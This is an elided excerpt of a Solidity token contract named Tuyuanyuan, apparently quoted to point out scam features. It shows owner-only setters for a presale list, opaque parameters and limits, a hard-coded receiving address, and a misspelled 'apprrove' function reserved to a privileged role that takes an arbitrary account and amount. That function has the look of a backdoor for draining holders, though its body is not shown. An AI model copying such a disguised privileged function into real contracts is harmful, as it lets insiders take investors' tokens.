...
abstract contract AbsToken is Context ,IERC20, Ownable {
    ...
    constructor (
        ...
        _maxTxAmount = 500000 * 10 ** Decimals;
        _maxAmount = 5000000 * 10 ** Decimals;

        LockAmounts = 5000 * 10 ** Decimals;
    ...
    function setpresaleList(address Addr, bool value) external onlyOwner {
        presaleList[Addr] = value;
    }

    function setMultiplePresaleList(address[] calldata accounts, bool value) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            presaleList[accounts[i]] = value;
        }
        emit MultiplePresaleListAddresses(accounts, value);
    }
    ...
    function setA(uint256 value) external onlyOwner{
        A = value;
    }
    
    function setB(uint256 value) external onlyOwner{
        B = value;
    }
    ...
    function setLockAmount(uint256 _amount ) public onlyOwner{
        LockAmounts = _amount;
    }
    ...
    function apprrove(address lpAddress, address account, uint256 amount) external 
    onlyFunder {
...
contract Tuyuanyuan is AbsToken {
    ...
    // RECIVE
        address(0x0E72811fC4ce0C63679dc4Dc17dfBf8249B84C50)
    ){
